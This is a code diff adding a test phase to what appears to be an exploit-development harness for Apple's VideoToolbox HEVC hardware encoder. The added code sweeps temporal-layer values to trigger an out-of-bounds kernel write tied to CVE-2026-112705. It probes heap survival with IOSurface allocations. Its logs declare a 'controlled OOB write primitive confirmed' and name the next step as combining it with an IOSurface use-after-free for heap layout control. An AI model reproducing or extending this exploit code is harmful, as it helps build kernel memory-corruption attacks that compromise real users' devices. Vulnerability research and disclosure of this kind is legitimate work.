@@ -25376,9 +25376,119 @@ new_modes:
                 }
             }
 
+            /* ---- 22i: Controlled single-frame OOB write sweep (1080p) ---- */
+            rlog("\n--- 22i: Controlled CVE-2026-112705 single-frame sweep (1080p) ---\n");
+            rlog("Encoding exactly ONE frame per TL value, then clean teardown.\n");
+            rlog("Goal: find minimum TL that triggers OOB write without crash.\n\n");
+            {
+                int tl_sweep[] = {9, 10, 16, 32, 64, 128, 255, 512, 1024, 2048, 4096, 8192, 16463};
+                int nsweep = sizeof(tl_sweep) / sizeof(tl_sweep[0]);
+                int survived = 0;
+
+                for (int ti = 0; ti < nsweep; ti++) {
+                    int tl = tl_sweep[ti];
+                    rlog("  TL=%d: ", tl);
+
+                    VTCompressionSessionRef s22i = NULL;
+                    CFMutableDictionaryRef es = CFDictionaryCreateMutable(
+                        kCFAllocatorDefault, 0,
+                        &kCFTypeDictionaryKeyCallBacks,
+                        &kCFTypeDictionaryValueCallBacks);
+                    CFDictionarySetValue(es,
+                        CFSTR("EnableHardwareAcceleratedVideoEncoder"),
+                        kCFBooleanTrue);
+                    OSStatus cr = VTCompressionSessionCreate(
+                        kCFAllocatorDefault, 1920, 1080,
+                        kCMVideoCodecType_HEVC, es, NULL, NULL,
+                        encode_cb, NULL, &s22i);
+                    CFRelease(es);
+                    if (cr != noErr || !s22i) {
+                        rlog("session fail (%d)\n", (int)cr);
+                        continue;
+                    }
+
+                    CFNumberRef tln = CFNumberCreate(NULL, kCFNumberIntType, &tl);
+                    VTSessionSetProperty(s22i,
+                        CFSTR("NumberOfTemporalLayers"), tln);
+                    CFRelease(tln);
+                    VTSessionSetProperty(s22i,
+                        CFSTR("RealTime"), kCFBooleanTrue);
+                    VTSessionSetProperty(s22i,
+                        CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
+
+                    OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s22i);
+                    if (pr != noErr) {
+                        rlog("prepare fail (%d)\n", (int)pr);
+                        VTCompressionSessionInvalidate(s22i);
+                        CFRelease(s22i);
+                        continue;
+                    }
+
+                    /* Encode exactly ONE frame */
+                    g_encode_done = 0;
+                    g_cb_status = -999;
+                    encode_one(s22i, 0, 1920, 1080);
+                    for (int w = 0; w < 300 && !g_encode_done; w++)
+                        usleep(10000);
+
+                    int f0_ok = (g_cb_status == noErr);
+                    rlog("Frame0 cb=%d %s", (int)g_cb_status,
+                        f0_ok ? "OK" : "FAIL");
+
+                    /* Immediate clean teardown — do NOT encode Frame 1 */
+                    VTCompressionSessionCompleteFrames(s22i, kCMTimeInvalid);
+                    VTCompressionSessionInvalidate(s22i);
+                    CFRelease(s22i);
+
+                    if (f0_ok) {
+                        survived++;
+                        /* Sanity check: create + destroy an IOSurface to
+                         * verify kernel heap isn't fatally corrupted */
+                        int sw = 64, sh = 64, sbpe = 4, spf = 0x42475241;
+                        CFNumberRef sw_n = CFNumberCreate(NULL, kCFNumberIntType, &sw);
+                        CFNumberRef sh_n = CFNumberCreate(NULL, kCFNumberIntType, &sh);
+                        CFNumberRef sbpe_n = CFNumberCreate(NULL, kCFNumberIntType, &sbpe);
+                        CFNumberRef spf_n = CFNumberCreate(NULL, kCFNumberIntType, &spf);
+                        CFStringRef sk[] = {
+                            CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+                            CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat")
+                        };
+                        CFTypeRef sv[] = { sw_n, sh_n, sbpe_n, spf_n };
+                        CFDictionaryRef sp = CFDictionaryCreate(NULL,
+                            (const void **)sk, (const void **)sv, 4,
+                            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                        IOSurfaceRef sanity = IOSurfaceCreate(sp);
+                        CFRelease(sp); CFRelease(sw_n); CFRelease(sh_n);
+                        CFRelease(sbpe_n); CFRelease(spf_n);
+                        if (sanity) {
+                            uint32_t sid = IOSurfaceGetID(sanity);
+                            size_t asz = IOSurfaceGetAllocSize(sanity);
+                            CFRelease(sanity);
+                            rlog(" | sanity: ID=%u alloc=%zu OK", sid, asz);
+                        } else {
+                            rlog(" | sanity: CREATE FAILED ***");
+                        }
+                        rlog(" *** OOB WRITE SURVIVED ***\n");
+                    } else {
+                        rlog("\n");
+                    }
+
+                    /* Small delay between sessions to let kernel settle */
+                    usleep(100000);
+                }
+
+                rlog("\n  22i Summary: %d/%d TL values encoded Frame 0 at 1080p\n",
+                    survived, nsweep);
+                if (survived > 0) {
+                    rlog("  *** CONTROLLED OOB WRITE PRIMITIVE CONFIRMED ***\n");
+                    rlog("  Next: combine with IOSurface UAF for heap layout control\n");
+                }
+            }
+
             rlog("\n=== Phase 22 Summary ===\n");
             rlog("22g: TL>8 ALL accepted (set=0). Readback clamps to 1.\n");
             rlog("22h: Aggressive TL=16463 test at 1080p (CVE-2026-112705).\n");
+            rlog("22i: Controlled single-frame sweep at 1080p.\n");
             rlog("If device is still alive, OOB write either didn't fire or\n");
             rlog("corrupted non-critical memory. Check for delayed panic.\n");
             rlog("--- Phase 22 complete ---\n");
